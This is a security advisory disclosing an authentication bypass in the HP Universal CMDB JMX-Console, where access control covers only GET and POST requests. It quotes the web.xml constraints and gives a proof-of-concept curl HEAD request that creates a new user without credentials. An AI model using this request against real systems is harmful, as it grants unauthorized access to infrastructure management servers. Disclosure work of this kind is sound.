Vendor's Description of the Software:
-------------------------------------
The HP Universal CMDB (UCMDB) automatically collects and manages accurate and
current business service definitions, associated infrastructure relationships and
detailed information on the assets, and is a central component in many of the key processes in your
IT organization, such as change management, asset management, service management, and business
service management. The UCMDB ensures that these processes can rely on comprehensive and
true data for all business services. Together with HP UCMDB Configuration Manager
(UCMDB-CM) you can standardize your IT environments, and make sure they comply with clear
policies, and defined authorization process.
Many IT organizations turn to a CMDB and configuration management processes to create a
shared single version of truth to support business service management, IT service management,
change management, and asset management initiatives. These initiatives help align IT efforts
with business requirements and run IT operations more efficiently and effectively.
The initiatives success depends on the CMDB providing a complete view into the
configuration items (CIs) and assets as well as how various IT elements relate together to deliver
the business service.

Vulnerability description
----------------------------
UCMB administrators heavily rely on a JMX-Console, which is installed by
default.
The JMX-Console web application in UCMDB performs access control only for
the GET and POST methods, which allows remote attackers to send requests
to this application's GET handler by using a different method (for example
HEAD).

The web.xml file of the JMX Console contains following security constrains:

```
<security-constraint>
<web-resource-collection>
<web-resource-name>Protected Pages</web-resource-name>
<url-pattern>/*</url-pattern>
<http-method>GET</http-method>
<http-method>POST</http-method>
</web-resource-collection>
<auth-constraint>
<role-name>sysadmin</role-name>
</auth-constraint>
</security-constraint>

<security-constraint>
<web-resource-collection>
<web-resource-name>Callhome Servlet</web-resource-name>
<url-pattern>/callhome</url-pattern>
<http-method>GET</http-method>
<http-method>POST</http-method>
</web-resource-collection>
</security-constraint>
```

This vulnerability is identical with CVE-2010-0738 (JBoss JMX-Console
Authentication bypass). This can be used to create a new account which
can then be used to access the JMX console.

Proof of concept:
-------------------
The following Curl command will send a HEAD request to create a new user
"pocuser" in the UCMDB Backend:

```bash
curl -I
"http://foobar:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&name=UCMDB%3Aservice%3DAuthorization+Services&methodName=createUser&arg0=&arg1=zdi-poc&arg2=pocuser&arg3=zdi-poc&arg4=pocuser"
```
